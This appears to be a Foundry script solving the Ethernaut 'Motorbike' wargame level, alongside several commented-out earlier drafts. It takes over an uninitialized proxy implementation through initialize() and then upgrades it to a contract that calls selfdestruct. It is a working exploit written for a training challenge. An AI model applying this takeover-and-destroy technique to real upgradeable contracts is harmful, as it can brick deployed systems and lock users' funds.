// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Ethernaut.sol";
import "forge-std/Script.sol";

interface Motorbike {
    function _getAddressSlot(bytes32 slot) external pure returns (address);
    function _delegate(address implementation) external;
}

interface Engine {
    function upgrader() external view returns (address);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
}

contract Ex {
    function ex() public {
        selfdestruct(payable(tx.origin));
    }
}

contract Sol {

    function solve(Ethernaut ethernaut, address level, address _eg, address _ex) public {
        ethernaut.createLevelInstance(Level(level));
        Engine(_eg).initialize();
        Engine(_eg).upgradeToAndCall(address(_ex), abi.encodeWithSignature("ex()"));
    }
}
// contract Sol {
//     Ethernaut ethernaut = Ethernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);

//     function solve(address level, address _eg, address _ex) public {
//         ethernaut.createLevelInstance(Level(level));
//         Engine(_eg).initialize();
//         Engine(_eg).upgradeToAndCall(address(_ex), abi.encodeWithSignature("ex()"));
//     }
// }

contract MotorbikeSol is Script {
    Ethernaut ethernaut = Ethernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    Level level = Level(0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6);

    function _getCodeSize(address addr) internal view returns (uint256 size) {
        assembly {
            size := extcodesize(addr)
        }
    }

    function run() external {
        vm.startBroadcast();

        Sol sol = new Sol();
        uint256 pk = uint256(vm.parseBytes32(vm.promptSecret("private key")));
        vm.signAndAttachDelegation(address(sol), pk);

        uint256 nonce = vm.getNonce(address(level));
        Engine eg_ = Engine(vm.computeCreateAddress(address(level), nonce));

        Sol(msg.sender).solve(ethernaut, address(level), address(eg_), address(new Ex()));
        console.log("Motorbike: ", address(vm.computeCreateAddress(address(level), nonce+1)));
        console.log("Engine: ", address(eg_));
        console.log("code size: ", _getCodeSize(address(eg_)));

        vm.stopBroadcast();
    }
}


// 
// contract MotorbikeSol is Script {
//     Ethernaut ethernaut = Ethernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);

//     function _getCodeSize(address addr) internal view returns (uint256 size) {
//         assembly {
//             size := extcodesize(addr)
//         }
//     }

//     function sol() public returns (address) {
//         vm.recordLogs();

//         ethernaut.createLevelInstance(Level(0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6));

//         VmSafe.Log[] memory events = vm.getRecordedLogs();
//         address instance = address(uint160(uint256(events[0].topics[2])));
//         console.log("Motorbike address:     ", instance);

//         Motorbike mb_ = Motorbike(payable(instance));
//         bytes32 _IMPLEMENTATION_SLOT = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
//         Engine eg_ = Engine(address(uint160(uint256(vm.load(address(mb_), _IMPLEMENTATION_SLOT)))));

//         eg_.initialize();
//         console.log("upgrader:              ", eg_.upgrader());

//         Ex ex = new Ex();
//         console.log("Ex contract address:   ", address(ex));
//         eg_.upgradeToAndCall(address(ex), abi.encodeWithSignature("ex()"));

//         return address(eg_);
//     }

//     function run() external {
//         vm.startBroadcast();

//         address eg_ = sol();
//         console.log("code size:             ", _getCodeSize(eg_));

//         vm.stopBroadcast();
//     }
// }


// 
// contract MotorbikeSol is Script {
//     Ethernaut ethernaut = Ethernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);

//     function _getCodeSize(address addr) internal view returns (uint256 size) {
//         assembly {
//             size := extcodesize(addr)
//         }
//     }

//     function run() external {
//         vm.recordLogs();
//         vm.startBroadcast();

//         ethernaut.createLevelInstance(Level(0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6));

//         VmSafe.Log[] memory events = vm.getRecordedLogs();
//         address instance = address(uint160(uint256(events[0].topics[2])));
//         console.log("Motorbike address:     ", instance);

//         Motorbike mb_ = Motorbike(payable(instance));
//         bytes32 _IMPLEMENTATION_SLOT = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
//         Engine eg_ = Engine(address(uint160(uint256(vm.load(address(mb_), _IMPLEMENTATION_SLOT)))));

//         eg_.initialize();
//         console.log("upgrader:              ", eg_.upgrader());

//         Ex ex = new Ex();
//         console.log("Ex contract address:   ", address(ex));
//         eg_.upgradeToAndCall(address(ex), abi.encodeWithSignature("ex()"));
//         console.log("code size:             ", _getCodeSize(eg_));

//         vm.stopBroadcast();
//     }
// }


// 
// contract MotorbikeSol is Script {
//     Motorbike public mb_ = Motorbike(payable(0x8428cFA36565EBA611FCB67D07194bC72b8e623E));
//     bytes32 internal constant _IMPLEMENTATION_SLOT = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
//     Engine public eg_ = Engine(uint160(uint256(vm.load(address(mb_), _IMPLEMENTATION_SLOT))));

//     function _getCodeSize(address addr) internal view returns (uint256 size) {
//         assembly {
//             size := extcodesize(addr)
//         }
//     }

//     function run() external {
//         vm.startBroadcast();

//         eg_.initialize();
//         console.log("upgrader:              ", eg_.upgrader());

//         Ex ex = new Ex();
//         console.log("Ex contract address:   ", address(ex));
//         eg_.upgradeToAndCall(address(ex), abi.encodeWithSignature("ex()"));
//         console.log("code size:             ", _getCodeSize(address(eg_)));

//         vm.stopBroadcast();
//     }
// }